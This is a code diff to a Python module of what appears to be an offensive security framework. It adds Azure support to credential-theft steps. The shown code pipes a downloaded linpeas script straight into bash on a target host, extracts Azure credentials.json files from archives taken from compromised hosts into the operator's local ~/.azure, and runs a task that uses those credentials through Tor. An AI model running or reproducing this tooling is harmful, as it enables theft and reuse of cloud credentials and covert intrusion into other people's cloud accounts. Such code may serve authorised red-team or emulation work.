@@ -95,11 +95,15 @@ class Module(BaseModule):
 
             def enumerate():
                 # run host enumeration
-                payload = 'curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20240218-68f9adb3/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex | tee /tmp/linpeas.txt'
-                session.log("payload loaded and ready")
-                result = run_base64_payload(
-                    session=session, payload=payload, log_name="payload_linpeas")
-                session.log(result)
+                try:
+                    payload = 'curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20240218-68f9adb3/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex | tee /tmp/linpeas.txt'
+                    session.log("payload loaded and ready")
+                    result = run_base64_payload(
+                        session=session, payload=payload, log_name="payload_linpeas")
+                    session.log(result)
+                except Exception as e:
+                    session.log(f"Enumeration failed: {e}")
+                    pass
 
             def exfiltrate(csp):
                 # create an instance profile to exfiltrate
@@ -242,6 +246,10 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                             local_creds = str(Path.joinpath(
                                 Path.home(), Path(".config/gcloud")))
                             container_creds = "/root/.config/gcloud"
+                        elif csp == "azure":
+                            local_creds = str(Path.joinpath(
+                                Path.home(), Path(".azure")))
+                            container_creds = "/root/.azure"
 
                         local_kube_creds = str(Path.joinpath(
                             Path.home(), Path(".kube")))
@@ -389,6 +397,31 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                     else:
                         session.log(
                             f"gcp creds not found: /tmp/{hostname}_gcp_creds.tgz")
+                elif csp == "azure":
+                    # create aws directory
+                    azure_dir = Path.joinpath(Path.home(), Path(".azure"))
+                    if not azure_dir.exists():
+                        # shutil.rmtree(azure_dir)
+                        azure_dir.mkdir(parents=True)
+
+                    # extract the first set azure creds
+                    if Path(f'/tmp/{hostname}_azure_creds.tgz').exists():
+                        file = tarfile.open(f'/tmp/{hostname}_azure_creds.tgz')
+                        for m in file.getmembers():
+                            if m.isfile() and (m.path.endswith('/.azure/credentials.json')):
+                                session.log(
+                                    f"extracting: {m.path} => {task_path}")
+                                file.extract(m, task_path)
+                                src_file = Path.joinpath(
+                                    task_path, Path(m.path))
+                                dst_file = Path.joinpath(
+                                    azure_dir, Path(os.path.basename(m.path)))
+                                session.log(
+                                    f"copying: {src_file} => {dst_file}")
+                                shutil.copy2(src_file, dst_file)
+                    else:
+                        session.log(
+                            f"azure creds not found: /tmp/{hostname}_azure_creds.tgz")
 
                 # copy our payload to the local working directory
                 task_script = Path(f"{script_dir}/../resources/{task_name}.sh")
@@ -467,6 +500,19 @@ echo $BUCKET_URL
                 result = run_base64_payload(
                     session=session, payload=payload, log_name="payload_retrieve_backup")
                 session.log(result)
+                session.log("credentialed_access_tor complete")
+            elif task_name == "azureiam2azuresql":
+                csp = "azure"
+                enum_exfil_prep_creds(csp, task_name)
+                # storage not available via tor network - region exclusion so we need to do this locally :(
+                session.log("running credentialed_access_tor...")
+                credentialed_access_tor(
+                    csp=csp,
+                    jobname=task_name,
+                    cwd=f'/{task_name}',
+                    script=f'{task_name}.sh',
+                    args=""
+                )
                 session.log("credentialed_access_tor complete")
             elif task_name == "socksscan":
                 socks_scan(session)
